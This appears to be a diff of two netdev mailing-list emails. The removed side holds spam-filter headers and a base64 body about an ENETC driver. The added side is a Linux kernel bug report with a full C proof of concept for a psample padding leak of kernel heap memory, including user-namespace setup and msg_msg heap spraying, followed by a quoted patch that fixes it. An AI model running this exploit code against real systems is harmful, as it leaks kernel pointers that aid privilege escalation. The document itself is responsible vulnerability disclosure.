 	FORGED_SENDER_FORWARDING(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
+	TO_DN_NONE(0.00)[];
 	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[wei.fang@oss.nxp.com,netdev@vger.kernel.org];
+	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
 	FORGED_RECIPIENTS_MAILLIST(0.00)[];
 	ALIAS_RESOLVED(0.00)[];
-	TAGGED_RCPT(0.00)[netdev];
-	RCPT_COUNT_THREE(0.00)[4];
 	FORGED_RECIPIENTS_FORWARDING(0.00)[];
-	MISSING_XM_UA(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[vger.kernel.org:from_smtp,oss.nxp.com:from_mime,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,DU2PR04MB8629.eurprd04.prod.outlook.com:mid,NXP1.onmicrosoft.com:dkim]
+	RCPT_COUNT_SEVEN(0.00)[8];
+	FORWARDED(0.00)[lists@lfdr.de];
+	TAGGED_RCPT(0.00)[netdev];
+	MIME_TRACE(0.00)[0:+]
 X-Rspamd-Server: lfdr
-X-Rspamd-Queue-Id: 17D0B64EC4B
+X-Rspamd-Queue-Id: A2DF964ED90
 
-PiA+IEBAIC0yMDksNiArMjA5LDEyMiBAQCBzdGF0aWMgaW50IGVuZXRjX3ZmX3NldHVwX3RjKHN0
-cnVjdCBuZXRfZGV2aWNlDQo+ID4gKm5kZXYsIGVudW0gdGNfc2V0dXBfdHlwZSB0eXBlLA0KPiA+
-ICtzdGF0aWMgaW50IGVuZXRjX3ZmX3NldF9tYWNfaGFzaF9maWx0ZXIoc3RydWN0IGVuZXRjX25k
-ZXZfcHJpdiAqcHJpdiwNCj4gPiArCQkJCQlzdHJ1Y3QgbmV0ZGV2X2h3X2FkZHJfbGlzdCAqdWMs
-DQo+ID4gKwkJCQkJc3RydWN0IG5ldGRldl9od19hZGRyX2xpc3QgKm1jKQ0KPiA+ICt7DQo+IA0K
-PiBbIC4uLiBdDQo+IA0KPiA+ICsJaWYgKG1hY19maWx0ZXJfdHlwZSAmIEVORVRDX01BQ19GSUxU
-RVJfVFlQRV9VQykgew0KPiA+ICsJCW1hY19maWx0ZXIgPSAmc2ktPm1hY19maWx0ZXJbVUNdOw0K
-PiA+ICsJCWVuZXRjX3Jlc2V0X21hY19hZGRyX2ZpbHRlcihtYWNfZmlsdGVyKTsNCj4gPiArCQlu
-ZXRkZXZfaHdfYWRkcl9saXN0X2Zvcl9lYWNoKGhhLCB1YykNCj4gPiArCQkJZW5ldGNfYWRkX21h
-Y19hZGRyX2h0X2ZpbHRlcihtYWNfZmlsdGVyLCBoYS0+YWRkcik7DQo+ID4gKw0KPiA+ICsJCW1l
-bWNweSgmaGFzaF92YWwsIG1hY19maWx0ZXItPm1hY19oYXNoX3RhYmxlLA0KPiA+ICsJCSAgICAg
-ICBzaXplb2YoaGFzaF92YWwpKTsNCj4gPiArCQltc2ctPmhhc2hfdGJsW2krK10gPSBoYXNoX3Zh
-bCAmIEdFTk1BU0soMzEsIDApOw0KPiA+ICsJCW1zZy0+aGFzaF90YmxbaSsrXSA9IGhhc2hfdmFs
-ID4+IDMyOw0KPiANCj4gW1NldmVyaXR5OiBIaWdoXQ0KPiBEb2VzIHRoaXMgbWVtY3B5KCkgYW5k
-IGJpdHdpc2Ugc2hpZnQgbG9naWMgY29ycmVjdGx5IGhhbmRsZSB0aGUgYml0bWFwDQo+IGNvbnZl
-cnNpb24gb24gMzItYml0IGJpZy1lbmRpYW4gc3lzdGVtcz8NCj4gDQo+IFNpbmNlIG1hY19oYXNo
-X3RhYmxlIGlzIGRlY2xhcmVkIHdpdGggREVDTEFSRV9CSVRNQVAobWFjX2hhc2hfdGFibGUsIDY0
-KSwNCj4gaXQgaXMgYW4gYXJyYXkgb2YgdW5zaWduZWQgbG9uZy4gT24gMzItYml0IGFyY2hpdGVj
-dHVyZXMsIHRoaXMgaXMgYW4gYXJyYXkgb2YgdHdvDQo+IDMyLWJpdCB3b3Jkcy4NCj4gDQo+IE9u
-IDMyLWJpdCBiaWctZW5kaWFuIHN5c3RlbXMsIG1lbWNweSgpIHdpbGwgcGxhY2UgdGhlIGZpcnN0
-IDMyLWJpdCB3b3JkDQo+IChtYWNfaGFzaF90YWJsZVswXSwgY29udGFpbmluZyBiaXRzIDAtMzEp
-IGludG8gdGhlIG1vc3Qgc2lnbmlmaWNhbnQgMzIgYml0cyBvZg0KPiB0aGUgdTY0IGhhc2hfdmFs
-LCBhbmQgdGhlIHNlY29uZCB3b3JkIChtYWNfaGFzaF90YWJsZVsxXSwgY29udGFpbmluZyBiaXRz
-DQo+IDMyLTYzKSBpbnRvIHRoZSBsZWFzdCBzaWduaWZpY2FudCAzMiBiaXRzLg0KPiANCj4gVGhl
-biwgaGFzaF92YWwgJiBHRU5NQVNLKDMxLCAwKSBncmFicyB0aGUgbG93ZXIgMzIgYml0cyAod2hp
-Y2ggaXMgYWN0dWFsbHkNCj4gYml0cyAzMi02MyBvZiB0aGUgYml0bWFwKSBhbmQgYXNzaWducyB0
-aGVtIHRvIG1zZy0+aGFzaF90YmxbMF0uIFRoaXMgc3dhcHMNCj4gdGhlIGhhbHZlcyBvZiB0aGUg
-Yml0bWFwIGFuZCBjb3JydXB0cyB0aGUgaGFyZHdhcmUgbWFpbGJveCBwYXlsb2FkLg0KPiANCj4g
-QWRkaXRpb25hbGx5LCB0aGlzIGNvZGUgYXBwZWFycyB0byBsYWNrIGV4cGxpY2l0IGNwdV90b19s
-ZTMyKCkgY29udmVyc2lvbnMgZm9yDQo+IHNlcmlhbGl6YXRpb24gaW50byBzaGFyZWQgbWVtb3J5
-LiBDb3VsZCBhIGhlbHBlciBsaWtlIGJpdG1hcF90b19hcnIzMigpIGJlDQo+IHVzZWQgaGVyZSBp
-bnN0ZWFkIHRvIGF2b2lkIHRoZXNlIGlzc3Vlcz8NCj4gDQo+ID4gKwl9DQo+ID4gKw0KPiA+ICsJ
-aWYgKG1hY19maWx0ZXJfdHlwZSAmIEVORVRDX01BQ19GSUxURVJfVFlQRV9NQykgew0KPiA+ICsJ
-CW1hY19maWx0ZXIgPSAmc2ktPm1hY19maWx0ZXJbTUNdOw0KPiA+ICsJCWVuZXRjX3Jlc2V0X21h
-Y19hZGRyX2ZpbHRlcihtYWNfZmlsdGVyKTsNCj4gPiArCQluZXRkZXZfaHdfYWRkcl9saXN0X2Zv
-cl9lYWNoKGhhLCBtYykNCj4gPiArCQkJZW5ldGNfYWRkX21hY19hZGRyX2h0X2ZpbHRlcihtYWNf
-ZmlsdGVyLCBoYS0+YWRkcik7DQo+ID4gKw0KPiA+ICsJCW1lbWNweSgmaGFzaF92YWwsIG1hY19m
-aWx0ZXItPm1hY19oYXNoX3RhYmxlLA0KPiA+ICsJCSAgICAgICBzaXplb2YoaGFzaF92YWwpKTsN
-Cj4gPiArCQltc2ctPmhhc2hfdGJsW2krK10gPSBoYXNoX3ZhbCAmIEdFTk1BU0soMzEsIDApOw0K
-PiA+ICsJCW1zZy0+aGFzaF90YmxbaSsrXSA9IGhhc2hfdmFsID4+IDMyOw0KPiANCj4gW1NldmVy
-aXR5OiBIaWdoXQ0KPiBUaGlzIGJsb2NrIGhhcyB0aGUgc2FtZSAzMi1iaXQgYmlnLWVuZGlhbiBj
-b252ZXJzaW9uIGFuZCBzZXJpYWxpemF0aW9uIGlzc3VlIGZvcg0KPiB0aGUgbXVsdGljYXN0IGJp
-dG1hcCBhcyBkZXNjcmliZWQgYWJvdmUgZm9yIHRoZSB1bmljYXN0IGJpdG1hcC4NCj4gDQoNCkFs
-bCBwbGF0Zm9ybXMgdXNlIEVORVRDIGFyZSBhcm02NCBsaXR0bGVyLWVuZGlhbiBzeXN0ZW1zLCBz
-byB0aGlzIGlzIG5vDQpzdWNoIGlzc3VlLg0KDQo=
+Thanks for your attention to this bug. Here are some resources to help
+you trigger the bug.
+
+Required key configs:
+```
+CONFIG_PSAMPLE=3Dy
+CONFIG_NET_ACT_SAMPLE=3Dy
+CONFIG_NET_CLS_ACT=3Dy
+CONFIG_NET_CLS_MATCHALL=3Dy
+CONFIG_NET_SCH_INGRESS=3Dy
+CONFIG_VETH=3Dy
+CONFIG_PACKET=3Dy
+CONFIG_USER_NS=3Dy
+CONFIG_NET_NS=3Dy
+```
+
+Here is a PoC trigger the intended kernel data leak:
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <linux/if.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <linux/genetlink.h>
+#include <linux/pkt_sched.h>
+#include <linux/pkt_cls.h>
+#include <linux/tc_act/tc_sample.h>
+#include <linux/veth.h>
+#include <arpa/inet.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+
+#define die(s) do { perror(s); exit(1); } while (0)
+
+/* psample uapi (subset) */
+#define PSAMPLE_GENL_NAME "psample"
+#define PSAMPLE_NL_MCGRP_SAMPLE_NAME "packets"
+#define PSAMPLE_ATTR_DATA 6
+#define PSAMPLE_CMD_SAMPLE 0
+
+#define TRUNC_SIZE 1301 /* not a multiple of 4 -> 3 padding bytes leak */
+
+/* NLA_HDRLEN comes from <linux/netlink.h> */
+
+/* ---- minimal netlink attribute builder ---- */
+static int nla_put_(char *buf, int off, int type, const void *data, int len=
+)
+{
+struct nlattr *a =3D (struct nlattr *)(buf + off);
+a->nla_type =3D type;
+a->nla_len =3D NLA_HDRLEN + len;
+if (len)
+memcpy((char *)a + NLA_HDRLEN, data, len);
+return off + NLA_ALIGN(NLA_HDRLEN + len);
+}
+static int nla_put_u32_(char *b, int o, int t, uint32_t v) { return
+nla_put_(b, o, t, &v, 4); }
+static int nla_put_str_(char *b, int o, int t, const char *s) { return
+nla_put_(b, o, t, s, strlen(s) + 1); }
+
+/* returns offset just past the header; pass it to nest_end to fix up nla_l=
+en */
+static int nest_start(char *buf, int off, int type)
+{
+struct nlattr *a =3D (struct nlattr *)(buf + off);
+a->nla_type =3D type | NLA_F_NESTED;
+a->nla_len =3D NLA_HDRLEN;
+return off + NLA_HDRLEN;
+}
+static int nest_end(char *buf, int hdr, int off)
+{
+struct nlattr *a =3D (struct nlattr *)(buf + hdr - NLA_HDRLEN);
+a->nla_len =3D off - (hdr - NLA_HDRLEN);
+return off;
+}
+
+static int nl_xchg(int fd, void *msg, int len, void *rsp, int rlen)
+{
+struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
+if (sendto(fd, msg, len, 0, (void *)&sa, sizeof(sa)) < 0)
+die("sendto");
+int n =3D recv(fd, rsp, rlen, 0);
+struct nlmsghdr *r =3D rsp;
+if (n > 0 && r->nlmsg_type =3D=3D NLMSG_ERROR) {
+struct nlmsgerr *e =3D NLMSG_DATA(r);
+if (e->error)
+fprintf(stderr, "[!] netlink ack: %s\n", strerror(-e->error));
+}
+return n;
+}
+
+/* ---- iface helpers ---- */
+static int if_index(const char *name)
+{
+int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
+struct ifreq ifr =3D {};
+strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
+if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) die("SIOCGIFINDEX");
+close(fd);
+return ifr.ifr_ifindex;
+}
+static void if_up(const char *name)
+{
+int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
+struct ifreq ifr =3D {};
+strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
+if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) die("SIOCGIFFLAGS");
+ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
+if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) die("SIOCSIFFLAGS");
+close(fd);
+}
+
+static void veth_create(int rt)
+{
+char buf[1024] =3D {}, rsp[1024];
+struct nlmsghdr *nh =3D (void *)buf;
+struct ifinfomsg *ifi;
+int off;
+
+nh->nlmsg_type =3D RTM_NEWLINK;
+nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*ifi));
+ifi =3D NLMSG_DATA(nh);
+ifi->ifi_family =3D AF_UNSPEC;
+off =3D nh->nlmsg_len;
+off =3D nla_put_str_(buf, off, IFLA_IFNAME, "veth0");
+int li =3D nest_start(buf, off, IFLA_LINKINFO);
+off =3D nla_put_str_(buf, li, IFLA_INFO_KIND, "veth");
+int id =3D nest_start(buf, off, IFLA_INFO_DATA);
+int pe =3D nest_start(buf, id, VETH_INFO_PEER);
+off =3D pe + NLMSG_ALIGN(sizeof(struct ifinfomsg)); /* peer ifinfomsg */
+off =3D nla_put_str_(buf, off, IFLA_IFNAME, "veth1");
+off =3D nest_end(buf, pe, off);
+off =3D nest_end(buf, id, off);
+off =3D nest_end(buf, li, off);
+nh->nlmsg_len =3D off;
+nl_xchg(rt, buf, off, rsp, sizeof(rsp));
+}
+
+static void qdisc_ingress(int rt, int ifindex)
+{
+char buf[256] =3D {}, rsp[256];
+struct nlmsghdr *nh =3D (void *)buf;
+struct tcmsg *tc;
+int off;
+
+nh->nlmsg_type =3D RTM_NEWQDISC;
+nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*tc));
+tc =3D NLMSG_DATA(nh);
+tc->tcm_family =3D AF_UNSPEC;
+tc->tcm_ifindex =3D ifindex;
+tc->tcm_handle =3D 0xffff0000; /* ffff:0 */
+tc->tcm_parent =3D TC_H_INGRESS;
+off =3D nla_put_str_(buf, nh->nlmsg_len, TCA_KIND, "ingress");
+nh->nlmsg_len =3D off;
+nl_xchg(rt, buf, off, rsp, sizeof(rsp));
+}
+
+/* matchall filter -> sample action (rate 1, group 1, trunc TRUNC_SIZE) */
+static void filter_sample(int rt, int ifindex)
+{
+char buf[1024] =3D {}, rsp[1024];
+struct nlmsghdr *nh =3D (void *)buf;
+struct tcmsg *tc;
+int off;
+
+nh->nlmsg_type =3D RTM_NEWTFILTER;
+nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*tc));
+tc =3D NLMSG_DATA(nh);
+tc->tcm_family =3D AF_UNSPEC;
+tc->tcm_ifindex =3D ifindex;
+tc->tcm_parent =3D 0xffff0000;
+tc->tcm_info =3D (1 << 16) | htons(ETH_P_ALL); /* prio 1, proto all */
+off =3D nla_put_str_(buf, nh->nlmsg_len, TCA_KIND, "matchall");
+
+int opt =3D nest_start(buf, off, TCA_OPTIONS);
+int act =3D nest_start(buf, opt, TCA_MATCHALL_ACT);
+int e1 =3D nest_start(buf, act, 1);
+off =3D nla_put_str_(buf, e1, TCA_ACT_KIND, "sample");
+int aopt =3D nest_start(buf, off, TCA_ACT_OPTIONS);
+struct tc_sample p =3D { .action =3D TC_ACT_PIPE, .index =3D 1 };
+off =3D nla_put_(buf, aopt, TCA_SAMPLE_PARMS, &p, sizeof(p));
+off =3D nla_put_u32_(buf, off, TCA_SAMPLE_RATE, 1);
+off =3D nla_put_u32_(buf, off, TCA_SAMPLE_TRUNC_SIZE, TRUNC_SIZE);
+off =3D nla_put_u32_(buf, off, TCA_SAMPLE_PSAMPLE_GROUP, 1);
+off =3D nest_end(buf, aopt, off);
+off =3D nest_end(buf, e1, off);
+off =3D nest_end(buf, act, off);
+off =3D nest_end(buf, opt, off);
+nh->nlmsg_len =3D off;
+nl_xchg(rt, buf, off, rsp, sizeof(rsp));
+}
+
+/* resolve psample family id + "packets" multicast group id */
+static uint32_t psample_mcgrp(int gfd)
+{
+char buf[256] =3D {}, rsp[4096];
+struct nlmsghdr *nh =3D (void *)buf;
+struct genlmsghdr *gh;
+int off;
+
+nh->nlmsg_type =3D GENL_ID_CTRL;
+nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
+gh =3D NLMSG_DATA(nh);
+gh->cmd =3D CTRL_CMD_GETFAMILY;
+off =3D nla_put_str_(buf, nh->nlmsg_len, CTRL_ATTR_FAMILY_NAME,
+PSAMPLE_GENL_NAME);
+nh->nlmsg_len =3D off;
+
+int n =3D nl_xchg(gfd, buf, off, rsp, sizeof(rsp));
+struct nlmsghdr *r =3D (void *)rsp;
+if (n <=3D 0 || r->nlmsg_type =3D=3D NLMSG_ERROR)
+return 0;
+
+/* walk attrs for CTRL_ATTR_MCAST_GROUPS -> {GRP_NAME, GRP_ID} */
+struct genlmsghdr *g =3D NLMSG_DATA(r);
+char *p =3D (char *)(g + 1);
+int len =3D r->nlmsg_len - NLMSG_LENGTH(sizeof(*g));
+for (; len > 0; len -=3D NLA_ALIGN(((struct nlattr *)p)->nla_len),
+p +=3D NLA_ALIGN(((struct nlattr *)p)->nla_len)) {
+struct nlattr *a =3D (void *)p;
+if ((a->nla_type & NLA_TYPE_MASK) !=3D CTRL_ATTR_MCAST_GROUPS)
+continue;
+char *gp =3D (char *)a + NLA_HDRLEN;
+int gl =3D a->nla_len - NLA_HDRLEN;
+for (; gl > 0; gl -=3D NLA_ALIGN(((struct nlattr *)gp)->nla_len),
+gp +=3D NLA_ALIGN(((struct nlattr *)gp)->nla_len)) {
+struct nlattr *grp =3D (void *)gp;
+char *ip =3D (char *)grp + NLA_HDRLEN;
+int il =3D grp->nla_len - NLA_HDRLEN;
+const char *name =3D NULL; uint32_t id =3D 0;
+for (; il > 0; il -=3D NLA_ALIGN(((struct nlattr *)ip)->nla_len),
+ip +=3D NLA_ALIGN(((struct nlattr *)ip)->nla_len)) {
+struct nlattr *ia =3D (void *)ip;
+int t =3D ia->nla_type & NLA_TYPE_MASK;
+if (t =3D=3D CTRL_ATTR_MCAST_GRP_NAME)
+name =3D (char *)ia + NLA_HDRLEN;
+else if (t =3D=3D CTRL_ATTR_MCAST_GRP_ID)
+id =3D *(uint32_t *)((char *)ia + NLA_HDRLEN);
+}
+if (name && !strcmp(name, PSAMPLE_NL_MCGRP_SAMPLE_NAME))
+return id;
+}
+}
+return 0;
+}
+
+/* Churn kmalloc-2k with msg_msg objects (each starts with two kernel heap
+* pointers in its m_list) so the page the victim skb head later lands on is
+* littered with 0xffff88.. bytes. INIT_ON_ALLOC is off, so a fresh skb-head
+* slot inherits those bytes in its uninitialised tail padding. Without this=
+,
+* a quiet VM hands back zeroed pages and the leak, while real, stays zero. =
+*/
+#define SPRAY_SZ 1900 /* sizeof(msg_msg)~48 + 1900 -> kmalloc-2k */
+#define SPRAY_CNT 256
+static void slab_churn(void)
+{
+static struct { long mtype; char mtext[SPRAY_SZ]; } m;
+int q[SPRAY_CNT], n =3D 0;
+m.mtype =3D 1;
+memset(m.mtext, 0x41, sizeof(m.mtext));
+for (int i =3D 0; i < SPRAY_CNT; i++) {
+if ((q[n] =3D msgget(IPC_PRIVATE, 0600 | IPC_CREAT)) < 0) break;
+msgsnd(q[n++], &m, SPRAY_SZ, IPC_NOWAIT);
+}
+for (int i =3D 0; i < n; i++) { /* free most -> pages recycled, not reclaim=
+ed */
+if (i & 7) msgrcv(q[i], &m, SPRAY_SZ, 0, IPC_NOWAIT | MSG_NOERROR);
+msgctl(q[i], IPC_RMID, NULL);
+}
+}
+
+static int pkt_socket(void)
+{
+int fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+if (fd < 0) die("socket(AF_PACKET)");
+struct sockaddr_ll sll =3D {
+.sll_family =3D AF_PACKET,
+.sll_protocol =3D htons(ETH_P_ALL),
+.sll_ifindex =3D if_index("veth0"),
+};
+if (bind(fd, (void *)&sll, sizeof(sll)) < 0) die("bind packet");
+return fd;
+}
+
+/* scan one multicast message for PSAMPLE_ATTR_DATA padding bytes */
+static int check_sample(struct nlmsghdr *nh)
+{
+struct genlmsghdr *g =3D NLMSG_DATA(nh);
+if (g->cmd !=3D PSAMPLE_CMD_SAMPLE)
+return 0;
+char *p =3D (char *)(g + 1);
+int len =3D nh->nlmsg_len - NLMSG_LENGTH(sizeof(*g));
+for (; len > 0; len -=3D NLA_ALIGN(((struct nlattr *)p)->nla_len),
+p +=3D NLA_ALIGN(((struct nlattr *)p)->nla_len)) {
+struct nlattr *a =3D (void *)p;
+if ((a->nla_type & NLA_TYPE_MASK) !=3D PSAMPLE_ATTR_DATA)
+continue;
+int payload =3D a->nla_len - NLA_HDRLEN;
+int pad =3D NLA_ALIGN(a->nla_len) - a->nla_len;
+unsigned char *q =3D (unsigned char *)a + a->nla_len;
+int nz =3D 0;
+for (int i =3D 0; i < pad; i++) nz |=3D q[i];
+if (pad && nz) {
+printf("[+] LEAK payload=3D%d pad=3D%d bytes:", payload, pad);
+for (int i =3D 0; i < pad; i++) printf(" %02x", q[i]);
+printf(" <- uninitialised kernel slab memory\n");
+return 1;
+}
+}
+return 0;
+}
+
+int main(void)
+{
+setvbuf(stdout, NULL, _IONBF, 0);
+
+/* unprivileged user + net namespace -> CAP_NET_ADMIN in the new netns */
+uid_t uid =3D getuid(), gid =3D getgid();
+if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
+die("unshare");
+int f =3D open("/proc/self/setgroups", O_WRONLY);
+if (f >=3D 0) { write(f, "deny", 4); close(f); }
+char m[64];
+f =3D open("/proc/self/uid_map", O_WRONLY);
+snprintf(m, sizeof(m), "0 %u 1\n", uid); write(f, m, strlen(m)); close(f);
+f =3D open("/proc/self/gid_map", O_WRONLY);
+snprintf(m, sizeof(m), "0 %u 1\n", gid); write(f, m, strlen(m)); close(f);
+
+if_up("lo");
+
+int rt =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
+if (rt < 0) die("socket(rtnl)");
+veth_create(rt);
+if_up("veth0");
+if_up("veth1");
+int idx1 =3D if_index("veth1");
+qdisc_ingress(rt, idx1);
+filter_sample(rt, idx1);
+
+int gfd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+if (gfd < 0) die("socket(genl)");
+uint32_t mcgrp =3D psample_mcgrp(gfd);
+if (!mcgrp) { fprintf(stderr, "[!] psample family not found
+(CONFIG_PSAMPLE?)\n"); return 1; }
+if (setsockopt(gfd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP, &mcgrp,
+sizeof(mcgrp)) < 0)
+die("NETLINK_ADD_MEMBERSHIP");
+printf("[*] joined PSAMPLE 'packets' mcgrp, trunc_size=3D%d\n", TRUNC_SIZE)=
+;
+
+int pkt =3D pkt_socket();
+unsigned char frame[1500];
+memset(frame, 0x41, sizeof(frame));
+memset(frame, 0xff, 6); /* broadcast dst */
+
+int leaks =3D 0;
+for (int round =3D 0; round < 200 && leaks < 5; round++) {
+slab_churn(); /* plant kernel pointers in kmalloc-2k before sampling */
+write(pkt, frame, sizeof(frame));
+
+char rbuf[16384];
+int n =3D recv(gfd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
+if (n <=3D 0) { usleep(5000); continue; }
+struct nlmsghdr *nh =3D (void *)rbuf;
+for (; NLMSG_OK(nh, (unsigned)n); nh =3D NLMSG_NEXT(nh, n))
+leaks +=3D check_sample(nh);
+}
+
+if (leaks)
+printf("[+] CONFIRMED: %d sample(s) leaked non-zero padding bytes\n", leaks=
+);
+else
+printf("[-] no non-zero padding seen this run (bug is still real)\n");
+return leaks ? 0 : 2;
+}
+```
+
+Let me know if you have any questions about this bug.
+
+Xiang
+
+On Sat, Jun 6, 2026 at 8:16=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
+>
+> psample_sample_packet() open-codes the PSAMPLE_ATTR_DATA attribute.
+> It reserves nla_total_size(data_len) bytes via skb_put() but only writes
+> NLA_HDRLEN + data_len of them, so when data_len is not a multiple of 4 th=
+e
+> up to 3 trailing alignment-padding bytes are left uninitialised.  The skb
+> head comes from kmalloc_reserve(), which does not zero memory, so those
+> bytes hold stale slab contents that are then broadcast to all listeners o=
+n
+> the PSAMPLE_NL_MCGRP_SAMPLE multicast group, leaking kernel heap memory t=
+o
+> userspace.
+>
+> Zero the trailing padding after the payload copy.
+>
+> Fixes: 6ae0a6286171 ("net: Introduce psample, a new genetlink channel for=
+ packet sampling")
+> Reported-by: Weiming Shi <bestswngs@gmail.com>
+> Assisted-by: Claude:claude-opus-4-8
+> Signed-off-by: Xiang Mei <xmei5@asu.edu>
+> ---
+>  net/psample/psample.c | 3 +++
+>  1 file changed, 3 insertions(+)
+>
+> diff --git a/net/psample/psample.c b/net/psample/psample.c
+> index 7763662036fb..26220dca0f12 100644
+> --- a/net/psample/psample.c
+> +++ b/net/psample/psample.c
+> @@ -485,6 +485,9 @@ void psample_sample_packet(struct psample_group *grou=
+p,
+>
+>                 if (skb_copy_bits(skb, 0, nla_data(nla), data_len))
+>                         goto error;
+> +
+> +               memset((unsigned char *)nla + nla->nla_len, 0,
+> +                      nla_padlen(data_len));
+>         }
+>
+>  #ifdef CONFIG_INET
+> --
+> 2.43.0
+>
 
